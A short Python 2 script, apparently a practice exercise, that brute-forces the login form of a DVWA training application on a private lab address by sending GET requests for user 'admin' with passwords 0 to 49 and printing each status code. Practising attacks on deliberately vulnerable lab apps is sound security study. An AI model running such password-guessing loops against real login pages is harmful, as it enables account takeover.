import requests
for i in range(50):
    url='http://192.168.25.216/dvwa/vulnerabilities/brute/?username=admin&password='+str(i)+'&Login=Login#'
    r=requests.get(url)
    print r.status_code